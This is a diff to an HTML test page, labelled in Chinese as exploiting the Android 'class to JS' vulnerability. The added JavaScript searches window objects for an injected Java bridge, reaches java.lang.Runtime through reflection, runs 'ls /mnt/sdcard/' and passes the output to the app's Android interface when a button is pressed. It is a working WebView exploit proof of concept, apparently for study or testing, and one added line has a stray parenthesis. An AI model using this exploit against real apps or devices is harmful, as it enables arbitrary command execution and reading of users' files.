@@ -2,7 +2,7 @@
 <html>
 <head>
     <meta charset="utf-8">
-    <h1> 测试网页 </h1>
+    <h1> 测试网页 网站被拦截 </h1>
 
     <script>
         // Android需要调用的方法
@@ -34,12 +34,31 @@
          function execute(cmdArgs){
              for (var obj in window) {
                  if ("getClass" in window[obj]) {
-                 alert(obj);
-                 return  window[obj].getClass().forName("java.lang.Runtime")
-                 .getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);
+                     return  window[obj].getClass().forName("java.lang.Runtime")
+                     .getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);
+                 }
              }
-        }
-}
+          }
+
+          function getContents(inputStream)
+          {
+             var contents = "";
+             var b = inputStream.read();
+             while(b != -1) {
+               var bString = String.fromCharCode(b);
+               contents += bString;
+               contents += "\n"
+               b = inputStream.read();
+             }
+             return contents;
+          }
+
+          function getData(){
+             alert("hello world");
+             var p = execute(["ls","/mnt/sdcard/"]);
+             var content = getContents(p.getInputStream()));
+             Android.getContents(content)
+         }
 
     </script>
 </head>
@@ -52,6 +71,6 @@
 <hr/>
 <button type="button" id="button3" onclick="clickprompt()">点击测试prompt</button>
 <hr/>
-<button type="button" id="button4" onclick="clickprompt()">利用Android class 2 js 漏洞</button>
+<button type="button" id="button4" onclick="getData()">利用Android class 2 js 漏洞</button>
 </body>
 </html>
